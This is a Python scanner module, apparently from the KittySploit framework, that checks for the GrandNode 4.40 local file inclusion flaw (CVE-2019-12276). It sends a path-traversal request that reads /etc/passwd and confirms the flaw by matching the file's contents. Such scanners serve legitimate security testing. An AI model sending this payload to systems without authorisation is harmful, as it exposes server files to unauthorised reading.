#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""GrandNode 4."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'GrandNode 4.40 - Local File Inclusion Detection',
        'description': 'GrandNode 4.40 is susceptible to local file inclusion in Controllers/LetsEncryptController.cs, which allows remote unauthenticated attackers to retrieve arbitrary files on the web server via specially crafted LetsEncrypt/Index?fileName= HTTP requests.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'packetstorm', 'lfi', 'grandnode', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://security401.com/grandnode-path-traversal/',
            'https://grandnode.com',
            'https://github.com/grandnode/grandnode',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-12276',
            'http://packetstormsecurity.com/files/153373/GrandNode-4.40-Path-Traversal-File-Download.html',
        ],
        'cve': 'CVE-2019-12276',
    }

    def run(self):
        r = self.http_request(method="GET", path='/LetsEncrypt/Index?fileName=/etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="GrandNode 4.40 - Local File Inclusion detected",
                path='/LetsEncrypt/Index?fileName=/etc/passwd',
            )
            return True
        return False

